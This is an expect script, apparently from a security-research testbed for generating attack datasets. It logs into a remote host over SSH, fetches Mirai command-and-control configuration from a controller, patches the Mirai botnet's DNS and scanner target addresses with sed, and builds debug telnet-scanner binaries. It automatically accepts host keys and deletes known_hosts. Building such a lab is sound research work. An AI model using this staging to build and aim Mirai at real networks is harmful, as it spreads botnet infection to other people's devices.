#!/usr/bin/expect -f
set delKnownHosts [lindex $argv 0]
set ip [lindex $argv 1]
set username [lindex $argv 2]
set password [lindex $argv 3]
set path [lindex $argv 4]
set controller_ip [lindex $argv 5]
set controller_user [lindex $argv 6]
set controller_pass [lindex $argv 7]
set controller_path [lindex $argv 8]
set transfer_pids [lindex $argv 9]
set dns [lindex $argv 10]
set ip_o1 [lindex $argv 11]
set ip_o2 [lindex $argv 12]
set ip_o3 [lindex $argv 13]
set ip_o4_1 [lindex $argv 14]
set ip_o4_2 [lindex $argv 15]

set cnc_config_path "CREME/CREME_backend_execution/scripts/configuration/prepared_files/mirai/cnc"
set debug_path "Mirai-Source-Code/mirai/debug"
set mirai_path "Mirai-Source-Code/mirai"

set timeout 120

# SSH connection
spawn /bin/bash $delKnownHosts
send "exit\r"
spawn ssh $username@$ip
expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$password\r"

# install expect
expect "*:~# "
send "apt -y install expect\r"

# download files
expect "*:~# "
send "rm ~/.ssh/known_hosts\r"
expect "*:~# "
send "scp $controller_user@$controller_ip:$controller_path/$cnc_config_path/* $path\r"
expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$controller_pass\r"

expect "*:~# "
send "chmod +x $path/* \r"
expect "*:~# "
send "> $transfer_pids\r"
expect "*:~# "
send "rm $path/$debug_path/*.txt\r"

# build Mirai-Source-Code
expect "*:~# "
send "cd $path/$mirai_path\r"

expect "Mirai-Source-Code/mirai# "
send "sed -i \"s/mirai_dns_xxx/$dns/g\" $path/$mirai_path/bot/resolv.c\r"

expect "Mirai-Source-Code/mirai# "
send "sed -i \"s/mirai_o1_xxx/$ip_o1/g\" $path/$mirai_path/template_scanner.c\r"
expect "Mirai-Source-Code/mirai# "
send "sed -i \"s/mirai_o2_xxx/$ip_o2/g\" $path/$mirai_path/template_scanner.c\r"
expect "Mirai-Source-Code/mirai# "
send "sed -i \"s/mirai_o3_xxx/$ip_o3/g\" $path/$mirai_path/template_scanner.c\r"

expect "Mirai-Source-Code/mirai# "
send "cp $path/$mirai_path/template_scanner.c $path/$mirai_path/bot/scanner.c \r"
expect "Mirai-Source-Code/mirai# "
send "sed -i \"s/mirai_o4_xxx/$ip_o4_1/g\" $path/$mirai_path/bot/scanner.c\r"
expect "Mirai-Source-Code/mirai# "
send "./build.sh debug telnet\r"
expect "Mirai-Source-Code/mirai# "
send "mv $path/$debug_path/mirai.dbg $path/$debug_path/mirai_scan.dbg \r"

expect "Mirai-Source-Code/mirai# "
send "cp $path/$mirai_path/template_scanner.c $path/$mirai_path/bot/scanner.c \r"
expect "Mirai-Source-Code/mirai# "
send "sed -i \"s/mirai_o4_xxx/$ip_o4_2/g\" $path/$mirai_path/bot/scanner.c\r"
expect "Mirai-Source-Code/mirai# "
send "./build.sh debug telnet\r"

expect "Mirai-Source-Code/mirai# "
send "exit\r"
